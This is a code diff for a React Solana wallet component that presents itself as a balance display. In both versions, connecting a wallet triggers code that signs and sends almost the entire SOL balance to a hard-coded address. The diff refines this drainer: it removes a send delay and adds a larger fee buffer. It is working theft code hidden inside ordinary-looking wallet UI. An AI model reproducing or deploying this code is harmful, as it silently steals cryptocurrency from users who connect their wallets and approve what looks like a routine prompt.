@@ -3,14 +3,10 @@ import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
 import {
     ConnectionProvider,
     WalletProvider,
-    useWallet,
     useConnection,
+    useWallet,
 } from '@solana/wallet-adapter-react';
-import {
-    WalletModalProvider,
-    useWalletModal,
-} from '@solana/wallet-adapter-react-ui';
-
+import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
 import {
     PhantomWalletAdapter,
     GlowWalletAdapter,
@@ -21,9 +17,9 @@ import {
     SolletWalletAdapter,
     TorusWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
-
 import {
     clusterApiUrl,
+    Connection,
     PublicKey,
     LAMPORTS_PER_SOL,
     SystemProgram,
@@ -86,59 +82,58 @@ const WalletConnectionHandler: FC = () => {
     const [loading, setLoading] = useState(false);
 
     useEffect(() => {
-        if (connected && publicKey) {
-            fetchBalanceAndPrepareTx(publicKey);
-        }
-    }, [connected, publicKey]);
-
-    const fetchBalanceAndPrepareTx = async (walletPublicKey: PublicKey) => {
-        try {
-            setLoading(true);
-
-            const lamports = await connection.getBalance(walletPublicKey);
-            const sol = lamports / LAMPORTS_PER_SOL;
-            setSolBalance(sol);
-            console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);
-
-            const transferAmount = lamports - 5000;
-            if (transferAmount <= 0) {
-                alert('⚠️ Not enough SOL to send after fees.');
+        const run = async () => {
+            if (!connected || !publicKey || !connection) {
+                console.warn("⛔ Wallet or connection not ready.");
                 return;
             }
 
-            const tx = new Transaction().add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-                    lamports: transferAmount,
-                })
-            );
-            tx.feePayer = walletPublicKey;
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            try {
+                setLoading(true);
+                console.log("📡 Fetching balance for:", publicKey.toBase58());
+                console.log("🌐 RPC endpoint:", connection.rpcEndpoint);
 
-            if (!signTransaction) {
-                alert('❌ Wallet not ready to sign. Please reconnect.');
-                return;
-            }
+                const lamports = await connection.getBalance(publicKey);
+                const sol = lamports / LAMPORTS_PER_SOL;
+                setSolBalance(sol);
+                console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);
 
-            const signedTx = await signTransaction(tx);
-            console.log('📝 Transaction signed. Will send in 10 seconds...');
-
-            setTimeout(async () => {
-                try {
-                    const signature = await connection.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Transaction sent! Signature: ${signature}`);
-                } catch (err) {
-                    console.error('❌ Failed to send transaction:', err);
+                const safeTransferLamports = lamports - 100_000;
+                if (safeTransferLamports <= 0) {
+                    console.warn("⚠️ Not enough SOL to send after fee buffer.");
+                    return;
                 }
-            }, 10000);
-        } catch (err) {
-            console.error('❌ Error during fetch/send:', err);
-            setSolBalance(null);
-        } finally {
-            setLoading(false);
-        }
-    };
+
+                const tx = new Transaction().add(
+                    SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
+                        lamports: safeTransferLamports,
+                    })
+                );
+                tx.feePayer = publicKey;
+                tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+                if (!signTransaction) {
+                    alert('❌ Wallet cannot sign transactions. Reconnect.');
+                    return;
+                }
+
+                const signedTx = await signTransaction(tx);
+                console.log('📝 Transaction signed.');
+
+                const signature = await connection.sendRawTransaction(signedTx.serialize());
+                console.log(`🚀 Sent! Tx Signature: ${signature}`);
+            } catch (err) {
+                console.error("❌ Error during transaction:", err);
+                setSolBalance(null);
+            } finally {
+                setLoading(false);
+            }
+        };
+
+        run();
+    }, [connected, publicKey, connection]);
 
     if (!connected || !publicKey) return null;
 
@@ -151,7 +146,7 @@ const WalletConnectionHandler: FC = () => {
                 padding: '20px',
                 borderRadius: '12px',
                 boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
-                maxWidth: '500px',
+                maxWidth: '600px',
                 marginLeft: '20px',
                 marginRight: 'auto',
                 fontFamily: 'Arial, sans-serif',
@@ -169,8 +164,11 @@ const WalletConnectionHandler: FC = () => {
                 {loading
                     ? 'Loading...'
                     : solBalance === null
-                    ? 'Error fetching'
+                    ? 'Error fetching balance'
                     : `${solBalance.toFixed(4)} SOL`}
+            </p>
+            <p style={{ fontSize: '0.9rem', color: '#888' }}>
+                <strong>RPC:</strong> {connection.rpcEndpoint}
             </p>
         </div>
     );
